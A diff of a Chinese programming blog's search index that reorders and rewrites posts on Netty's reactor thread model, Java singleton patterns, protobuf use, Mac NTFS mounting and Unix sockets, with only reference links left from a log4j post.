-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
-<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
-]]></content>
-      <tags>
-        <tag>log4j</tag>
-        <tag>rce</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mac 实现 NTFS 格式硬盘读写</title>
-    <url>/mac-NTFS.html</url>
-    <content><![CDATA[<h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>Mac本身是支持NTFS写入的，只是NTFS是微软开发，由于版权和一些技术细节原因，苹果不愿公开说自己支持NTFS写入，也是有自己以后可能不支持NTFS写入的考量</p>
-<span id="more"></span>
+<h3 id="序列化调用"><a href="#序列化调用" class="headerlink" title="序列化调用"></a>序列化调用</h3><p>引入 maven 依赖</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.protobuf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>protobuf-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><ol>
-<li>挂载上你的NTFS硬盘，查看硬盘名称</li>
-<li>编辑/etc/fstab文件，使其支持NTFS写入</li>
-<li>将/Volumes中的NTFS磁盘快捷方式到Finder</li>
-</ol>
-<h2 id="详细流程"><a href="#详细流程" class="headerlink" title="详细流程"></a>详细流程</h2><ol>
-<li>插上硬盘后，查看你的硬盘名称，这里假设名称是AngleDisk</li>
-<li>打开Applications的Terminal, 你也可以直接spotlight输入terminal打开</li>
-<li>在终端输入sudo nano /etc/fstab 敲击回车</li>
-<li>现在你看到了一个编辑界面，输入LABEL=AngleDisk none ntfs rw,auto,nobrowse后，敲击回车，再Ctrl+X，再敲击Y，再敲击回车</li>
-<li>此时，退出你的移动硬盘，再重新插入，你会发现磁盘没有显示在桌面或是Finder之前出现的地方，别慌</li>
-<li>打开Finder，Command+Shift+G，输入框中输入/Volumes，回车，你就可以看到你的磁盘啦！是可以读写的哟，Enjoy</li>
-<li>方便起见，你可以直接把磁盘拖到Finder侧边栏中，这样下次使用就不用进入到/Volumes目录打开le</li>
-</ol>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhihu.com/question/19571334">https://www.zhihu.com/question/19571334</a></p>
 ]]></content>
       <categories>
-        <category>101</category>
+        <category>java进阶</category>
       </categories>
       <tags>
-        <tag>mac</tag>
-        <tag>ntfs</tag>
+        <tag>protobuf</tag>
+        <tag>proto</tag>
       </tags>
   </entry>
   <entry>
-    <title>reactor-thread-model-and-its-application-in-netty</title>
+    <title>reactor 线程模型及在 netty 中的应用</title>
     <url>/reactor-thread-model-and-its-application-in-netty.html</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h2 id="IO-模型"><a href="#IO-模型" class="headerlink" title="IO 模型"></a>IO 模型</h2><h3 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202112131825833.png" alt="clipboard.png"></p>
+<h3 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h3><h3 id="阻塞-I-O-模型"><a href="#阻塞-I-O-模型" class="headerlink" title="#### 阻塞 I/O 模型"></a>#### 阻塞 I/O 模型</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202112131825717.png" alt="clipboard.png"></p>
+<p>用户进程调用 recvfrom，内核没有数据会返回 error（立即返回），有数据会阻塞将数据拷贝到用户态并返回 OK</p>
+<p>所以，nonblocking IO的特点是用户进程需要<strong>不断的主动询问</strong>kernel数据好了没有。</p>
+<h3 id="I-O-多路复用模型"><a href="#I-O-多路复用模型" class="headerlink" title="#### I/O 多路复用模型"></a>#### I/O 多路复用模型</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202112131826184.png" alt="clipboard.png"></p>
+<p>上述轮训 recvfrom，效率较低。这里使用 select/epoll 系统调用，可以监听多个 socker fd。调用 select 阻塞等待返回有 I/O 事件的 fd。然后再调用 recvfrom 获取数据。</p>
+<p>select/epoll 的优势在于多数 I/O 连接。当  I/O 连接很少时，使用 BIO 性能更高（只需要一个 recvfrom 命令）</p>
+<h3 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202112131836224.png" alt="clipboard.png"></p>
+<p>用户进程向内核注册 I/O 事件，内核会等待数据准备完成，然后将数据拷贝到用户内存，最后会通知用户进程（发送 signal）</p>
+<h2 id="reactor-线程模型"><a href="#reactor-线程模型" class="headerlink" title="reactor 线程模型"></a>reactor 线程模型</h2><p>reactor 类似于 dispatch 的意思，是一个事件驱动模型，应用业务向一个中间人（dispatcher）注册一个回调（event handler），当 I/O 就绪后，dispatcher 通知 event handler 进行处理</p>
+<h3 id="reactor-多线程模型"><a href="#reactor-多线程模型" class="headerlink" title="reactor 多线程模型"></a>reactor 多线程模型</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202112131843842.png" alt="image-20211213184308795"></p>
+<p>mainReactor 监听 accpet 事件，client 连接成功后，将连接转发给 subReactor。subReactor 监听读写事件（包括完成读写操作）</p>
+<blockquote>
+<p>Acceptor 接收到客户端 TCP 连接请求处理完成后（可能包含接入认证等），将新创建的 SocketChannel 注册到 IO 线程池（subReactor 线程池）的某个 IO 线程上，由它负责 SocketChannel 的读写和编解码工作。Acceptor 线程池仅仅只用于客户端的登陆、握手和安全认证，一旦链路建立成功，就将链路注册到后端 subReactor 线程池的 IO 线程上，由 IO 线程负责后续的 IO 操作。</p>
+</blockquote>
+<p>mainReactor 一般单线程就够了，subReactor 是多线程</p>
+<h2 id="netty-线程模型"><a href="#netty-线程模型" class="headerlink" title="netty 线程模型"></a>netty 线程模型</h2><p>同 reactoc 多线程模型，Netty里对应mainReactor的角色叫做“Boss”，而对应subReactor的角色叫做”Worker”</p>
+<p>在Netty 4.0之后，作者觉得<code>NioSelector</code>这个叫法，以及区分<code>NioBoss</code>和<code>NioWorker</code>的做法稍微繁琐了点，干脆就将这些合并成了<code>NioEventLoop</code>，从此这两个角色就不做区分了。</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202112131854825.png" alt="39f28ab4f3e613b83779c21dc70d9d8c.png"></p>
+<p>上图是 Netty4 的 EventLoop 处理流程，<strong>IO 读写和业务处理都在 worker 线程中</strong></p>
+<p>如果业务处理耗时长，会影响 worker 线程的整体并发，需要异步处理业务流程</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://gee.cs.oswego.edu/dl/cpjslides/nio.pdf">nio.pdf (oswego.edu)</a></p>
+<p><a href="https://github.com/code4craft/netty-learning/blob/master/posts/ch4-reactor.md">code4craft/netty-learning</a></p>
+]]></content>
       <categories>
         <category>java进阶</category>
       </categories>
@@ -1239,23 +1301,58 @@
       </tags>
   </entry>
   <entry>
-    <title>Unix socket 与 TCP/IP socket 的区别</title>
-    <url>/unix-socket-and-tcp-ip-socket.html</url>
-    <content><![CDATA[<h2 id="Unix-socket"><a href="#Unix-socket" class="headerlink" title="Unix socket"></a>Unix socket</h2><p>又叫 IPC（inter-process communication 进程间通信） socket，用于实现同一主机上的进程间通信。通过监听 path（Unix 文件系统路径） 而不是 port。直接将应用层数据从一个进程拷贝到另一个进程，不需要经过网络层（检查、路由等），因此比 IP socket 效率更高。</p>
-<p>MySQL 对此特性的优化，如果发现地址是 localhost，就会使用 unix 套接字来提升性能。具体参考：<a href="https://dev.mysql.com/doc/refman/8.0/en/connecting.html">https://dev.mysql.com/doc/refman/8.0/en/connecting.html</a></p>
-<p>通过以下命令来列出本机 Unix socket</p>
-<p>Linux: <code>netstat -a -p --unix</code></p>
-<p>Mac: <code>netstat -a -f unix</code></p>
-<p>Windows: 没有 Unix socket，有个类似的机制叫做 <strong>Named pipes</strong>。win10 支持 Unix socket，有一些限制，具体参考：<a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/">https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/</a></p>
-<h2 id="TCP-IP-socket"><a href="#TCP-IP-socket" class="headerlink" title="TCP/IP socket"></a>TCP/IP socket</h2><p>进程间网络通信机制，也可以实现同一主机进程通信（通过使用环回接口）。一个 IP socket connection 由 &lt;local IP, local port, remote IP and remote port&gt; 唯一标识。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets">https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets</a></p>
+    <title>单例模式</title>
+    <url>/singleton.html</url>
+    <content><![CDATA[<h2 id="饿汉式单例"><a href="#饿汉式单例" class="headerlink" title="饿汉式单例"></a>饿汉式单例</h2><p>类加载立即初始化，绝对线程安全，不存在访问安全问题。Spring IOC 容器 ApplicationContext 就是一个饿汉式单例。</p>
+<p>优点：没有任何加锁，执行效率高，用户体验好</p>
+<p>缺点：类加载就初始化，浪费空间</p>
+<span id="more"></span>
+
+<p>简单实例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungrySingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** 也可以放在静态代码块中 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HungrySingleton HUNGRY_SINGLETON = <span class="keyword">new</span> HungrySingleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungrySingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> HUNGRY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="懒汉式单例"><a href="#懒汉式单例" class="headerlink" title="懒汉式单例"></a>懒汉式单例</h2><p>需要时才加载</p>
+<h3 id="通过-double-check-实现："><a href="#通过-double-check-实现：" class="headerlink" title="通过 double-check 实现："></a>通过 double-check 实现：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyDoubleCheckSingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 需要用 volatile 修饰保证可见性和重排序</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> LazyDoubleCheckSingleton lazy;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyDoubleCheckSingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LazyDoubleCheckSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (LazyDoubleCheckSingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 1.分配内存给对象</span></span><br><span class="line">                    <span class="comment">// 2.初始化对象</span></span><br><span class="line">                    <span class="comment">// 3.lazy 指向该对象</span></span><br><span class="line">                    lazy = <span class="keyword">new</span> LazyDoubleCheckSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="通过静态内部类实现："><a href="#通过静态内部类实现：" class="headerlink" title="通过静态内部类实现："></a>通过静态内部类实现：</h3><p>double-check 方法需要加锁，对程序性能有一定影响，用静态内部类实现更好</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> zhouxinghang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019-05-16</span></span><br><span class="line"><span class="comment"> * 外部类初次加载，会初始化静态变量、静态代码块、静态方法，但不会加载内部类和静态内部类。</span></span><br><span class="line"><span class="comment"> * 实例化外部类，调用外部类的静态方法、静态变量，则外部类必须先进行加载，但只加载一次。</span></span><br><span class="line"><span class="comment"> * 直接调用静态内部类时，外部类不会加载。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="单例模式的破坏"><a href="#单例模式的破坏" class="headerlink" title="单例模式的破坏"></a>单例模式的破坏</h2><h3 id="反射破坏单例模式"><a href="#反射破坏单例模式" class="headerlink" title="反射破坏单例模式"></a>反射破坏单例模式</h3><p>尽管构造方法加了 private 修饰，但是可以通过反射调用构造方法，因此对构造方法加以限制，重复创建直接抛出异常。</p>
+<p>以上述 LazySingleton 为例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="序列化破坏单例模式"><a href="#序列化破坏单例模式" class="headerlink" title="序列化破坏单例模式"></a>序列化破坏单例模式</h3><p>在序列化操作时，反序列化后的对象会重新分配内存空间，即重新创建，如果目标是单例对象，就会破坏单例模式。</p>
+<p>对此，我们只需要增加 readResolve() 方法即可。以上述 LazySingleton 为例，修改如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保证反序列化还是原对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至于为什么，需要看 JDK 序列化源码。ObjectInputStream 类的 readObject() -&gt; readObject0() -&gt; readOrdinaryObject() -&gt; invokeReadResolve()。invokeReadResolve 代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/71BF431A-33F0-4C49-A683-69AF7B27BDFE.png" alt="invokeReadResolve"></p>
+<p>而 readResolveMethod 是在在私有方法 ObjectStreamClass() 中赋值的，代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/2143B7C0-E237-45EB-8D0D-FA667EC34717.png" alt="readResolveMethod"></p>
+<p>可见的，如果被序列化的类定义了 readResolve() 方法，就会调用该方法实现反序列化。</p>
+<p>增加 readResolve() 方法可以防止单例模式被破坏，但是在 readOrdinaryObject() 方法中还是会创建一个新对象的，只不过返回的是readResolve() 方法返回值。具体代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/351EE59B-F579-4B54-BE81-50C017D19F31.png" alt="创建一个新对象"></p>
+<p>注册式单例可以避免这个问题</p>
+<h2 id="注册式单例"><a href="#注册式单例" class="headerlink" title="注册式单例"></a>注册式单例</h2><p>注册式单例又称为登记式单例，就是将每一个实例都登记到某一个地方，使用唯一的标 识获取实例。注册式单例有两种写法：一种为容器缓存，一种为枚举登记。枚举单例也是《Effective Java》书中推荐的一种单例实现写法</p>
+<h3 id="枚举单例"><a href="#枚举单例" class="headerlink" title="枚举单例"></a>枚举单例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span>  <span class="title">EnumSingleton</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(Object date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EnumSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过反编译发现枚举类是通过静态代码块实现的饿汉式单例模式，反编译代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">&#123;</span><br><span class="line">    INSTANCE = <span class="keyword">new</span> EnumSingleton(<span class="string">&quot;INSTANCE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    $VALUES = (<span class="keyword">new</span> EnumSingleton[] &#123;</span><br><span class="line">        INSTANCE</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>枚举缓存既不会被序列化破坏，也不会被反射破坏。</p>
+<p>对于序列化，在 ObjectInputStream 类中 readEnum() 方法里，发现枚举类型是通过类名和 Class 对象类找到唯一的枚举对象，代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/11AC67F5-4A3E-427F-A758-9C7AA9A20444.png" alt="readEnum"></p>
+<p>对于反射，Constructor 类中的 newInstance() 方法对于枚举类，直接抛出异常：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/9286BD38-C4BA-468A-A523-B6EAD2569951.png" alt="newInstance"></p>
+<h3 id="容器缓存单例"><a href="#容器缓存单例" class="headerlink" title="容器缓存单例"></a>容器缓存单例</h3><p>可以看看 Spring 容器式单例实现：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/31EC471D-8239-49AC-88B9-BA5C538D97D7.png" alt="Spring容器"></p>
 ]]></content>
       <categories>
-        <category>计算机网络</category>
+        <category>java</category>
       </categories>
       <tags>
-        <tag>socket</tag>
-        <tag>tcp</tag>
+        <tag>源码</tag>
+        <tag>设计模式</tag>
       </tags>
   </entry>
   <entry>
@@ -1320,108 +1417,39 @@
       </tags>
   </entry>
   <entry>
-    <title>protobuf 安装使用</title>
-    <url>/protobuf-use.html</url>
-    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
-<li><p>官网下载 <a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a></p>
-</li>
-<li><p>解压，cd 到目录下</p>
-</li>
-<li><p>./configure</p>
-</li>
-<li><p>make</p>
-</li>
-<li><p>make check</p>
-</li>
-<li><p>sudo make install</p>
-</li>
-<li><p>which protoc</p>
-</li>
-<li><p>protoc –version</p>
-<span id="more"></span></li>
-</ul>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="编写proto文件（idl文件）"><a href="#编写proto文件（idl文件）" class="headerlink" title="编写proto文件（idl文件）"></a>编写proto文件（idl文件）</h3><p>一个名为 Person.proto文件如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax=&quot;proto3&quot;; </span><br><span class="line">option java_package = &quot;org.serialization.protobuf.quickstart&quot;;   </span><br><span class="line">option java_outer_classname = &quot;PersonProtobuf&quot;;   </span><br><span class="line">message Person  &#123;   </span><br><span class="line">  int32 age = 1;</span><br><span class="line">  string name = 2;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>使用 protoc 编译器，将 proto 文件编译成 java 文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protoc --java_out=./ Person.proto</span><br></pre></td></tr></table></figure>
-
-<h3 id="序列化调用"><a href="#序列化调用" class="headerlink" title="序列化调用"></a>序列化调用</h3><p>引入 maven 依赖</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.protobuf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>protobuf-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>java进阶</category>
-      </categories>
-      <tags>
-        <tag>protobuf</tag>
-        <tag>proto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>单例模式</title>
-    <url>/singleton.html</url>
-    <content><![CDATA[<h2 id="饿汉式单例"><a href="#饿汉式单例" class="headerlink" title="饿汉式单例"></a>饿汉式单例</h2><p>类加载立即初始化，绝对线程安全，不存在访问安全问题。Spring IOC 容器 ApplicationContext 就是一个饿汉式单例。</p>
-<p>优点：没有任何加锁，执行效率高，用户体验好</p>
-<p>缺点：类加载就初始化，浪费空间</p>
-<span id="more"></span>
-
-<p>简单实例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungrySingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** 也可以放在静态代码块中 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HungrySingleton HUNGRY_SINGLETON = <span class="keyword">new</span> HungrySingleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungrySingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> HUNGRY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="懒汉式单例"><a href="#懒汉式单例" class="headerlink" title="懒汉式单例"></a>懒汉式单例</h2><p>需要时才加载</p>
-<h3 id="通过-double-check-实现："><a href="#通过-double-check-实现：" class="headerlink" title="通过 double-check 实现："></a>通过 double-check 实现：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyDoubleCheckSingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 需要用 volatile 修饰保证可见性和重排序</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> LazyDoubleCheckSingleton lazy;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyDoubleCheckSingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LazyDoubleCheckSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (LazyDoubleCheckSingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 1.分配内存给对象</span></span><br><span class="line">                    <span class="comment">// 2.初始化对象</span></span><br><span class="line">                    <span class="comment">// 3.lazy 指向该对象</span></span><br><span class="line">                    lazy = <span class="keyword">new</span> LazyDoubleCheckSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="通过静态内部类实现："><a href="#通过静态内部类实现：" class="headerlink" title="通过静态内部类实现："></a>通过静态内部类实现：</h3><p>double-check 方法需要加锁，对程序性能有一定影响，用静态内部类实现更好</p>
